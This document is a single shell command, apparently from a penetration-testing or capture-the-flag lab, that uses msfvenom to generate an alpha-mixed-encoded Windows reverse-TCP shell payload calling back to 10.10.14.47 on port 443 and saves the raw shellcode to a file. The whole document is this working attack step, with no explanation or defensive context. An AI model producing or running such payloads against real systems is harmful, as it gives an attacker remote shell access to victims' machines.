
```
msfvenom -p windows/shell_reverse_tcp -f raw -e x86/alpha_mixed LHOST=10.10.14.47 LPORT=443 > shellcode_rev_10.10.14.47_443
```
